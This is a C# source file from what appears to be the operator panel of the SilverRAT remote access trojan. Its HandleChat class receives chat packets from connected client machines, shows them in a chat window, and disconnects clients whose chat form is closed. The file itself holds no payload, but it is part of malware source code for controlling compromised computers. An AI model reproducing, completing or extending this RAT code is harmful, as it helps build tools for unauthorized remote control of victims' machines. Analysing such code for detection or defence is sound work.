using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.MessagePack;
using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

internal class HandleChat
{
    public void Read(MsgPack unpack_msgpack, Clients client)
    {
        try
        {
            Chat chat = (Chat)Application.OpenForms["Chat:" + unpack_msgpack.ForcePathObject("ID").AsString];
            if (chat != null)
            {
                Console.Beep();
                chat.RixhTextBox1.SelectionColor = Color.Blue;
                chat.RixhTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                chat.RixhTextBox1.SelectionColor = Color.Black;
                chat.RixhTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput2").AsString);
                chat.RixhTextBox1.SelectionStart = chat.RixhTextBox1.TextLength;
                chat.RixhTextBox1.ScrollToCaret();
            }
            else
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "chatExit";
                ThreadPool.QueueUserWorkItem(client.Send, msgPack.Encode2Bytes());
                client.Disconnected();
            }
        }
        catch
        {
        }
    }

    public void GetClient(MsgPack unpack_msgpack, Clients client)
    {
        Chat chat = (Chat)Application.OpenForms["Chat:" + unpack_msgpack.ForcePathObject("ID").AsString];
        if (chat != null && chat.Client == null)
        {
            chat.Client = client;
            chat.RixhTextBox1.Visible = true;
            chat.RixhTextBox1.Enabled = true;
            chat.TextSend.Enabled = true;
            chat.Timer1.Enabled = true;
            chat.TopTols.Visible = true;
            chat.BottomTols.Visible = true;
            chat.LoaderConnect.Visible = false;
            chat.PanelLoagen.Visible = false;
        }
    }
}
